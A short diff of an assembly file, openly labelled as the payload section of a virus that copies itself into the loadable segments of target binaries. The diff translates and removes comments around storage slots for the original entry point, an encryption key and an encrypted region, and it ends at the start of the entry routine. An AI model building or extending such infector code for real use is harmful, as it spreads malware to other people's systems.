@@ -1,27 +1,19 @@
 ; ============================================
-; VIRUS PAYLOAD - The part that gets executed in infected binaries
-; This section contains everything needed for the virus to run
-; All data is embedded in code and all buffers are stack-allocated
+; VIRUS PAYLOAD - tout ce qui est contenu entre virus_start & virus_end 
+;                 sera copie dans les pt_load des binaires cibles
 ; ============================================
 
 virus_start:
-; Original entry point storage (patched during infection)
 original_entry_storage:
-    dq 0                        ; 8 bytes for original entry point
-
-; Encryption key storage (16 bytes for alphanumeric key)
+    dq 0                        
 encryption_key:
-    db "0000000000000000"        ; Will be replaced by encrypt program
-    
-; Encrypted flag (1 byte: 0 = not encrypted, 1 = encrypted)
+    db "0000000000000000"        
 encrypted_flag:
     db 0
-
-; Encrypted region info (filled by encrypt program)
 encrypted_offset:
-    dq 0                        ; 8 bytes: file offset of encrypted region
+    dq 0                        
 encrypted_size:
-    dq 0                        ; 8 bytes: size of encrypted region
+    dq 0                        
 
 _start:
     ; Save all registers we'll use
